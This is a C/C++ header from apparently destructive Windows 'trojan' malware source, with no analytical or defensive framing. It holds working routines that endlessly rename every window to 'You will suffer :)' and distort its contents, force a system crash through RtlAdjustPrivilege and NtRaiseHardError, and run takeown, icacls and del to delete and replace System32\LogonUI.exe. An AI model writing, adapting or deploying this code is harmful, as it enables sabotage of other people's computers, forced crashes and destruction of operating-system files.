#pragma once
#include <windows.h>

#define AUDIO_PAYLOAD_MSG 69420

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;

typedef struct AUDIO {
    int i;
    BYTE SequenceEquation;
    int SampleRate;
    int SampleCount;
} TROJAN_AUDIO_SEQUENCE;

typedef void(TROJAN_PAYLOAD)(HDC hdcScreen);
typedef void(TROJAN_SHADER)(int w, int h, PRGBQUAD prgbScreen);

HCRYPTPROV prov;
DWORD xs;

int random() {
    if (prov == NULL)
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);

    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}

void SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}

DWORD Xorshift32() {
    xs ^= xs << 13;
    xs ^= xs >> 17;
    xs ^= xs << 5;
    return xs;
}

COLORREF HtoRGB(float H) {
    float s = 1;
    float v = 1;
    float C = s * v;
    float X = C * (1 - fabs(fmod(H / 60.0, 2) - 1));
    float m = v - C;
    float r, g, b;
    if (H >= 0 && H < 60) {
        r = C, g = X, b = 0;
    } else if (H >= 60 && H < 120) {
        r = X, g = C, b = 0;
    } else if (H >= 120 && H < 180) {
        r = 0, g = C, b = X;
    } else if (H >= 180 && H < 240) {
        r = 0, g = X, b = C;
    } else if (H >= 240 && H < 300) {
        r = X, g = 0, b = C;
    } else {
        r = C, g = 0, b = X;
    }
    int R = (r + m) * 255;
    int G = (g + m) * 255;
    int B = (b + m) * 255;

    return RGB(R, G, B);
}

void ClearEffects() {
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
}

BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeout(hwnd, WM_SETTEXT, NULL, (LPARAM)L"You will suffer :)", SMTO_ABORTIFHUNG, 100, NULL);

    RECT rcWindow;
    GetWindowRect(hwnd, &rcWindow);
    int cxWindow = rcWindow.right - rcWindow.left;
    int cyWindow = rcWindow.bottom - rcWindow.top;
    HDC hdcWindow = GetDC(hwnd);
    int ry = rand() % cxWindow;
    BitBlt(hdcWindow, 0, ry, cxWindow, 1, hdcWindow, random() % 3 - 1, ry, SRCCOPY);
    ReleaseDC(NULL, hdcWindow);
    DeleteObject(hdcWindow);

    EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
    return true;
}

void WindowsCorruptionPayload() {
    while (true) {
        EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
    }
}

void CrashWindows() {
    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

    unsigned char unused1;
    long unsigned int unused2;

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(0x13, true, false, &unused1);
        NtRaiseHardError(0x00069420, 0, 0, 0, 6, &unused2);
    }

    FreeLibrary(hNtdll);

    ExitWindows();

    ExitProcess(0);
}

void OverwriteLogonUI() {
    system("takeown /f C:\\Windows\\System32 && takeown /f C:\\Windows\\System32\\LogonUI.exe && icacls C:\\Windows\\System32 /grant %username% && del C:\\Windows\\System32\\LogonUI.exe");
    MoveFile(L"LogonUI.exe", L"C:\\Windows\\System32\LogonUI.exe");
}